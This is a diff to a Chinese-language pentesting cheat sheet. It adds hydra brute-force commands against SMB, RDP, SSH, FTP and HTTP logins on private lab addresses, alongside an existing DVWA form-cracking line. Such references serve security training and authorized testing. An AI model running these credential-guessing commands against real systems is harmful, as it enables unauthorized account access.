@@ -36,12 +36,11 @@
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `hydra(九头蛇) <https://github.com/vanhauser-thc/thc-hydra>`_
 	 | ``查看模块用法：hydra -U http-form-post``
-	 | ``hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
-
-		::
-		
-				注：此类模块是破解HTTP服务器身份验证。
-				
+	 | ``smb破解：hydra -l Administrator -P pass.txt smb://192.168.47`` 
+	 | ``3389破解：hydra -l Administrator -P pass.txt rdp://192.168.47.124 -t 1 -V`` 
+	 | ``ssh破解：hydra -l msfadmin -P pass.txt ssh://192.168.47.133 -vV`` 
+	 | ``ftp破解：hydra -L user.txt -P pass.txt ftp://192.168.47.133 -s 2121 -e nsr -t 1 -vV`` 
+	 | ``HTTP服务器身份验证破解：hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
 	 | ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form \"/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed\" -V``
 
 		::
